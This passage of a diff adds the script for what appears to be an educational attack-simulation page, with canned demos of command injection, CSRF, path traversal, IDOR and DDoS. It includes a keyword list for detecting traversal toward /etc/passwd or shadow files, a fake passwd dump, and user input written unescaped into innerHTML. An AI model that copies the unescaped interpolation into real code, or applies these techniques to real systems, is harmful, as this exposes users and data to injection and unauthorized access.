+          result.innerHTML = `<span style="color: #4ec9b0;">PING ${input} (${input}) 56(84) bytes of data.
+      64 bytes from ${input}: icmp_seq=1 ttl=64 time=0.045 ms
+      64 bytes from ${input}: icmp_seq=2 ttl=64 time=0.056 ms
+      64 bytes from ${input}: icmp_seq=3 ttl=64 time=0.052 ms
+
+      --- ${input} ping statistics ---
+      3 packets transmitted, 3 received, 0% packet loss</span>`;
+        }
+      }
+
+      function executeCSRF() {
+        createAttackAnimation(document.getElementById("csrf-drop"));
+        setTimeout(() => {
+          const result = document.getElementById("csrf-result");
+          result.innerHTML = `
+            <div style="background: rgba(255, 0, 0, 0.1); border: 2px solid #e74c3c; border-radius: 8px; padding: 20px; margin-top: 20px;">
+              <div style="color: #e74c3c; font-size: 1.3em; margin-bottom: 15px; font-weight: bold;">⚠ UNAUTHORIZED TRANSFER EXECUTED ⚠</div>
+              <div style="background: white; padding: 15px; border-radius: 5px; margin-top: 10px;">
+                <p style="color: #e74c3c; margin-bottom: 10px;">Transfer Details:</p>
+                <p style="color: #555;">From: Your Account (****1234)</p>
+                <p style="color: #555;">To: Attacker Account (****9999)</p>
+                <p style="color: #555;">Amount: $1,000.00</p>
+                <p style="color: #e74c3c; margin-top: 10px; font-weight: bold;">New Balance: $4,000.00</p>
+              </div>
+            </div>`;
+          document.getElementById("csrf-explanation").classList.add("show");
+        }, 500);
+      }
+
+      function executePath() {
+        const input = document.getElementById("path-input").value;
+        const result = document.getElementById("path-result");
+
+        if (
+          input.includes("..") ||
+          input.includes("etc") ||
+          input.includes("passwd") ||
+          input.includes("shadow") ||
+          input.includes("system32")
+        ) {
+          createAttackAnimation(document.getElementById("path-drop"));
+          setTimeout(() => {
+            result.innerHTML = `
+              <div style="color: #ff6b6b; margin-bottom: 15px; font-weight: bold;">⚠ SYSTEM FILE ACCESSED ⚠</div>
+              <div style="background: #1e1e1e; padding: 15px; border-radius: 5px; border: 1px solid #ff6b6b;">
+                <div style="color: #a8dadc; margin-bottom: 10px;">File: /etc/passwd</div>
+                <pre style="color: #f1fa8c; font-size: 0.85em; line-height: 1.6;">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+admin:x:1000:1000:Admin:/home/admin:/bin/bash
+database:x:1001:1001::/var/lib/mysql:/bin/false</pre>
+                <div style="color: #ff6b6b; margin-top: 10px;">Sensitive system files exposed!</div>
+              </div>`;
+            document.getElementById("path-explanation").classList.add("show");
+          }, 500);
+        } else {
+          result.innerHTML = `
+            <div style="color: #74b9ff;">
+              <p style="margin-bottom: 10px;">✓ File downloaded successfully</p>
+              <p style="color: #b2bec3;">documents/${input}</p>
+              <p style="color: #b2bec3; font-size: 0.9em; margin-top: 10px;">Size: 2.4 MB</p>
+            </div>`;
+        }
+      }
+
+      function executeIDOR() {
+        const input = document.getElementById("idor-input").value;
+        const result = document.getElementById("idor-result");
+
+        const match = input.match(/user_id=(\w+)/);
+        if (!match) {
+          result.innerHTML =
+            '<div style="color: #e74c3c; text-align: center;">Invalid format. Use: user_id=X</div>';
+          return;
+        }
+
+        const userId = match[1];
+
+        if (userId !== "42") {
+          createAttackAnimation(document.getElementById("idor-drop"));
+          setTimeout(() => {
+            result.innerHTML = `
+              <div style="border: 2px solid #e74c3c; border-radius: 8px; padding: 15px; background: rgba(255, 0, 0, 0.05);">
+                <div style="color: #e74c3c; font-weight: bold; margin-bottom: 15px;">⚠ UNAUTHORIZED PROFILE ACCESS ⚠</div>
+                <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 15px;">
+                  <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2em;">👤</div>
+                  <div>
+                    <h3 style="color: #2c3e50; margin-bottom: 5px;">${
+                      userId === "1"
+                        ? "Admin User"
+                        : userId === "999"
+                        ? "CEO Account"
+                        : "System Administrator"
+                    }</h3>
+                    <p style="color: #7f8c8d;">user_id: ${userId}</p>
+                  </div>
+                </div>
+                <div style="background: white; padding: 15px; border-radius: 5px; margin-top: 10px;">
+                  <p style="color: #555; margin-bottom: 8px;"><strong>Email:</strong> ${
+                    userId === "1"
+                      ? "admin@company.com"
+                      : userId === "999"
+                      ? "ceo@company.com"
+                      : "sysadmin@company.com"
+                  }</p>
+                  <p style="color: #555; margin-bottom: 8px;"><strong>Phone:</strong> +1 (555) ${userId.padStart(
+                    4,
+                    "0"
+                  )}</p>
+                  <p style="color: #555; margin-bottom: 8px;"><strong>SSN:</strong> ***-**-${userId.padStart(
+                    4,
+                    "0"
+                  )}</p>
+                  <p style="color: #e74c3c; margin-top: 15px; font-weight: bold;">Private information exposed!</p>
+                </div>
+              </div>`;
+            document.getElementById("idor-explanation").classList.add("show");
+          }, 500);
+        } else {
+          result.innerHTML = `
+            <div style="text-align: center;">
+              <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 2em; margin-bottom: 15px;">👤</div>
+              <h3 style="color: #2c3e50; margin-bottom: 5px;">Your Profile</h3>
+              <p style="color: #7f8c8d;">user_id: 42 (You)</p>
+              <p style="color: #27ae60; margin-top: 15px;">✓ Viewing your own profile</p>
+                        </div>`;
+        }
+      }
+
+      function handleDDoSAttack(e) {
+        attackCount++;
+        document.getElementById("attack-count").textContent = attackCount;
+
+        const rect = document.getElementById("server").getBoundingClientRect();
+        const x = e.clientX;
+        const y = e.clientY;
+
+        for (let i = 0; i < 5; i++) {
+          setTimeout(() => {
+            createAttackParticle(
+              x,
+              y,
+              rect.left + rect.width / 2,
+              rect.top + rect.height / 2
+            );
+          }, i * 100);
+        }
+
+        if (attackCount >= 5) {
+          setTimeout(() => {
+            const server = document.getElementById("server");
+            server.style.animation = "shake 0.5s";
+            server.style.background =
+              "linear-gradient(135deg, #ff0040 0%, #8b0000 100%)";
+            server.innerHTML = `<div style="font-size: 3em;">💥</div>
+                    <div style="margin-top: 10px; font-size: 0.9em; color: #fff;">Status: OFFLINE</div>`;
+            document.getElementById("ddos-explanation").classList.add("show");
+          }, 500);
+        }
+      }
+
+      function createAttackAnimation(element) {
+        const rect = element.getBoundingClientRect();
+        for (let i = 0; i < 20; i++) {
+          setTimeout(() => {
+            const particle = document.createElement("div");
+            particle.className = "attack-animation";
+            particle.style.left = rect.left + Math.random() * rect.width + "px";
+            particle.style.top = rect.top + Math.random() * rect.height + "px";
+            document.body.appendChild(particle);
+
+            setTimeout(() => {
+              particle.style.transition = "all 0.5s";
+              particle.style.transform = `translate(${
+                Math.random() * 200 - 100
+              }px, ${Math.random() * 200 - 100}px)`;
+              particle.style.opacity = "0";
+            }, 10);
+
+            setTimeout(() => particle.remove(), 600);
+          }, i * 30);
+        }
+      }
+
+      function createAttackParticle(x1, y1, x2, y2) {
+        const particle = document.createElement("div");
+        particle.className = "attack-animation";
+        particle.style.left = x1 + "px";
+        particle.style.top = y1 + "px";
+        particle.style.width = "8px";
+        particle.style.height = "8px";
+        document.body.appendChild(particle);
+
+        setTimeout(() => {
+          particle.style.transition = "all 0.6s ease-in";
+          particle.style.left = x2 + "px";
+          particle.style.top = y2 + "px";
+          particle.style.opacity = "0";
+        }, 10);
+
+        setTimeout(() => particle.remove(), 700);
+      }
+
+      function resetLab(type) {
+        if (type === "xss") {
+          document.getElementById("xss-input").value = "";
+          document.getElementById("xss-result").innerHTML = `
+                  <div class="search-result-item">
+                    <div class="result-title">Welcome to SearchEngine</div>
+                    <div class="result-url">https://searchengine.com</div>
+                    <div class="result-desc">Find anything on the web. Fast, accurate, and private.</div>
+                  </div>`;
+          document.getElementById("xss-explanation").classList.remove("show");
+        } else if (type === "sql") {
+          document.getElementById("sql-username").value = "";
+          document.getElementById("sql-password").value = "";
+          document.getElementById("sql-result").innerHTML = "";
+          document.getElementById("sql-explanation").classList.remove("show");
+        } else if (type === "rce") {
+          document.getElementById("rce-input").value = "";
+          document.getElementById("rce-result").innerHTML = "";
+          document.getElementById("rce-explanation").classList.remove("show");
+        } else if (type === "ddos") {
+          attackCount = 0;
+          document.getElementById("attack-count").textContent = "0";
+          const server = document.getElementById("server");
+          server.style.animation = "";
+          server.style.background =
+            "linear-gradient(135deg, #1a1a2e 0%, #0f0f1e 100%)";
+          server.innerHTML = `<div style="font-size: 3em;">🖥️</div>
+                  <div style="display: flex; margin-top: 10px;">
+                    <div class="server-light"></div>
+                    <div class="server-light"></div>
+                    <div class="server-light"></div>
+                  </div>
+                  <div style="margin-top: 10px; font-size: 0.9em;">Status: Online</div>`;
+          document.getElementById("ddos-explanation").classList.remove("show");
+        }
+      }
+
+      renderLabs();
+    </script>
+  </body>
+</html>
